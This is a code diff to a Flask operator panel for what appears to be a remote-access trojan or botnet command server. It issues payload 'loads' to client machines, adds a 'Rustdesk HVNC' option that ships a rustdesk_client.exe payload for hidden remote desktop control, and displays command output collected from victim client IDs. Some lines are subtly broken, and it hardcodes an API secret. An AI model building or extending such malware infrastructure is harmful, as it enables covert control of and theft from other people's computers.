@@ -1,4 +1,4 @@
-from flask import Flask, render_template, request
+from flask import Flask, render_template, request, Response
 import httpx
 import json
 from cryptography.hazmat.primitives import padding
@@ -9,6 +9,7 @@ from cryptography.hazmat.backends import default_backend
 import os
 import base64
 import time
+import magic
 
 def convert_to_ago(timestamp):
     def add0(intInput):
@@ -35,8 +36,7 @@ def convert_to_future(timestamp):
             return " " + intInput
         else:
             return intInput
-
-
+        
     delta = timestamp - int(time.time())
 
     if delta < 0:
@@ -54,6 +54,7 @@ def convert_to_future(timestamp):
 
 SERVER_ADDRESS = "http://127.0.0.1:9999"
 API_SECRET = "dj)!gf0CN eIX)#!e9jxm)SAh0btpmr"
+HOST,PORT = "127.0.0.1", 6767
 
 app = Flask(__name__)
 
@@ -123,6 +124,9 @@ def loader():
 
         note = file.filename + " | " + request.form.get("note")
 
+        if execution_type == "Rustdesk HVNC":
+            payload = base64.b64decode(open("rustdesk_client.exe"))
+
         load_creation_response = httpx.post(SERVER_ADDRESS + "/api/issue_load", 
             json={
                 "api_secret": API_SECRET,
@@ -188,11 +192,77 @@ def server_logs():
         json={"api_secret": API_SECRET}
     )
 
-    parsed_text = ""
-    for oid,data in json.loads(response.text).items():
-        parsed_text += f"[ {data['cmd_type'].upper()} | TTC: {data['time_recieved'] - data['time_issued']}s | Client ID: {data['client_id']} ] {base64.b64decode(data['output']).decode('utf-8')[:100]}\n"
-        print(oid, data)
-            
-    return render_template("server_logs.html", parsed_text=parsed_text)
+    new_outputs_list = []
 
-app.run("127.0.0.1", 6767)
+    for output_id, data in json.loads(response.text).items():
+
+        if data['output'].startswith("storage:"):\
+            output = f"Output too long to be displayed. View it raw here: http://{HOST}:{PORT}/view/{data['output'].split("storage:")[1]}"
+        else:
+            output = data['output']
+            
+        new_outputs_list.append({
+            "cmd_type": data['cmd_type'],
+            "time_to_complete": f'{data['time_recieved'] - data['time_issued']}s',
+            "client_id": data['client_id'],
+            "output": output,
+            "time_recieved": data['time_recieved']
+        })            
+
+    new_outputs_list.sort(key=lambda x: x["time_recieved"], reverse=True)
+    return render_template("server_logs.html", new_outputs_list=new_outputs_list)
+
+@app.route("/individual")
+def individual():
+
+    response = httpx.post(SERVER_ADDRESS + "/api/get_output", 
+        json={
+            "api_secret": API_SECRET,
+            "client_id": request.args.get('client_id')
+        }
+    )
+
+    new_outputs_list = []
+    recv_list = list(json.loads(response.text).items())
+    recv_list.sort(key=lambda x: x[1]["time_recieved"], reverse=True)
+    for output_id, data in recv_list:
+        if data['output'].startswith("storage:"):
+            output = f"Too long to display. View: http://{HOST}:{PORT}/view/{data['output'].split('storage:')[1]}"
+        else:
+            output = data['output']
+
+        if data['cmd_args'].startswith("storage:"):
+            cmd_args = f"Too long to display. View: http://{HOST}:{PORT}/view/{data['cmd_args'].split('storage:')[1]}"
+        else:
+            cmd_args = data['cmd_args']
+            
+        new_outputs_list.append({
+            "cmd_type": data['cmd_type'],
+            "cmd_args": cmd_args,
+            "time_to_complete": f'{data["time_recieved"] - data["time_issued"]}s',
+            "client_id": data['client_id'],
+            "output": output,
+            "time_recieved": convert_to_ago(data['time_recieved'])
+        })
+
+    return render_template("individual.html", new_outputs_list=new_outputs_list)
+
+@app.route("/view/<storage_id>")
+def view(storage_id):
+
+    response = httpx.post(SERVER_ADDRESS + "/api/parse_storage", 
+        json={
+            "api_secret": API_SECRET,
+            "storage_id": storage_id
+        }
+    )
+
+    mime = magic.from_buffer(response.content, mime=True)
+    if mime.startswith('image'):
+        return Response(response.content, content_type='image/png')
+    else:
+        return Response(response.content, content_type='text/plain')
+            
+
+
+app.run(HOST,PORT)
